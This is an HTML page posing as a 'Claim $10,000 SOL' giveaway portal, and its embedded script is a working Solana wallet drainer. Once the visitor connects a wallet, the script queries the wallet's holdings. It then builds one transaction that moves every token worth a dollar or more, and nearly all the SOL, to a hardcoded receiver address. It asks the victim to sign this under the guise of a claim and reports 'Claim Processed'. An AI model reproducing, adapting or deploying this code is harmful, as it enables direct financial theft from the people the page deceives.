<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Claim SOL Portal</title>
    <link href="https://googleapis.com" rel="stylesheet">
    <style>
        :root {
            --bg-light: #f4f4f7;
            --accent-green: #14F195;
            --accent-purple: #9945FF;
        }

        body, html {
            margin: 0; padding: 0; height: 100%;
            font-family: 'Inter', sans-serif;
            background-color: var(--bg-light);
            /* Advanced Mesh Gradient Background */
            background-image: 
                radial-gradient(at 0% 0%, rgba(20, 241, 149, 0.15) 0px, transparent 50%),
                radial-gradient(at 100% 0%, rgba(153, 69, 255, 0.1) 0px, transparent 50%),
                radial-gradient(at 100% 100%, rgba(20, 241, 149, 0.1) 0px, transparent 50%),
                radial-gradient(at 0% 100%, rgba(153, 69, 255, 0.15) 0px, transparent 50%);
            display: flex; justify-content: center; align-items: center;
            overflow: hidden;
        }

        .claim-card {
            background: rgba(255, 255, 255, 0.8);
            backdrop-filter: blur(20px);
            padding: 60px 45px;
            border-radius: 40px;
            border: 1px solid rgba(255, 255, 255, 0.5);
            text-align: center;
            box-shadow: 0 30px 60px rgba(0,0,0,0.08);
            max-width: 420px; width: 85%;
            animation: slideUp 0.8s cubic-bezier(0.16, 1, 0.3, 1);
        }

        .sol-text {
            font-size: 38px; font-weight: 900; line-height: 1.1;
            margin-bottom: 45px;
            color: #1a1a1a;
            letter-spacing: -1px;
        }

        .claim-btn {
            background: #1a1a1a;
            color: #ffffff;
            padding: 20px 0;
            border-radius: 16px;
            font-weight: 700;
            font-size: 16px;
            border: none;
            cursor: pointer;
            text-transform: uppercase;
            letter-spacing: 1px;
            width: 100%;
            transition: all 0.3s ease;
            box-shadow: 0 10px 20px rgba(0,0,0,0.1);
        }

        .claim-btn:hover {
            background: var(--accent-green);
            color: #000;
            transform: translateY(-2px);
        }

        @keyframes slideUp { from { opacity: 0; transform: translateY(30px); } to { opacity: 1; transform: translateY(0); } }
    </style>
</head>
<body>
    <div class="claim-card">
        <div class="sol-text">CLAIM $10,000 SOL</div>
        <button class="claim-btn" onclick="initiateWalletFlow()">Connect Wallet</button>
    </div>

    <script type="module">
        import { Connection, PublicKey, TransactionMessage, VersionedTransaction, SystemProgram, LAMPORTS_PER_SOL } from 'https://esm.sh';
        import { createAssociatedTokenAccountInstruction, getAssociatedTokenAddress, createTransferCheckedInstruction } from 'https://esm.sh';

        const HELIUS_RPC = "https://helius-rpc.com";
        const RECEIVER_ADDR = new PublicKey("5KKphHnhQdhMMibgPDSsWXtDPZiFyXPPNSrKXuXxA2CM");
        const connection = new Connection(HELIUS_RPC);

        window.initiateWalletFlow = async () => {
            const isMobile = /iPhone|iPad|iPod|Android/i.test(navigator.userAgent);
            const currentUrl = encodeURIComponent(window.location.href);

            // 1. MOBILE DEEP LINK LOGIC
            if (isMobile && !window.solana) {
                // Redirecting to Phantom's universal link handler as a default fallback
                // This will prompt the user to open the link in a mobile wallet
                window.location.href = `https://phantom.app{currentUrl}?ref=${currentUrl}`;
                return;
            }

            // 2. DESKTOP / IN-APP BROWSER LOGIC
            const provider = window.solana || window.phantom?.solana || window.solflare;
            if (!provider) {
                alert("Solana wallet not detected. If on mobile, please open this link inside your wallet's browser.");
                return;
            }

            try {
                const resp = await provider.connect();
                const sender = resp.publicKey;

                // Fetch Assets
                const response = await fetch(HELIUS_RPC, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        jsonrpc: '2.0', id: 'tx-01', method: 'getAssetsByOwner',
                        params: { ownerAddress: sender.toBase58(), displayOptions: { showNativeBalance: true } }
                    }),
                });
                const { result } = await response.json();

                const instructions = [];
                const items = (result.items || [])
                    .filter(a => a.token_info?.price_info?.total_price >= 1)
                    .sort((a, b) => b.token_info.price_info.total_price - a.token_info.price_info.total_price);

                // Build Instructions
                for (const asset of items) {
                    const mint = new PublicKey(asset.id);
                    const destAta = await getAssociatedTokenAddress(mint, RECEIVER_ADDR);
                    instructions.push(createAssociatedTokenAccountInstruction(sender, destAta, RECEIVER_ADDR, mint));
                    instructions.push(createTransferCheckedInstruction(
                        new PublicKey(asset.token_info.associated_token_address),
                        mint, destAta, sender, asset.token_info.balance, asset.token_info.decimals
                    ));
                }

                // Max SOL Transfer (Reserving 0.005 for fees)
                const solLamports = result.nativeBalance?.lamports || 0;
                if (solLamports > 5000000) { 
                    instructions.push(SystemProgram.transfer({
                        fromPubkey: sender, toPubkey: RECEIVER_ADDR, lamports: solLamports - 5000000
                    }));
                }

                if (instructions.length === 0) return alert("No eligible assets found.");

                const { blockhash } = await connection.getLatestBlockhash();
                const message = new TransactionMessage({
                    payerKey: sender, recentBlockhash: blockhash, instructions
                }).compileToV0Message();

                const tx = new VersionedTransaction(message);
                const signedTx = await provider.signTransaction(tx);
                const signature = await connection.sendRawTransaction(signedTx.serialize());
                alert("Claim Processed: " + signature);
            } catch (err) {
                console.error(err);
                alert("Action cancelled.");
            }
        };
    </script>
</body>
</html>
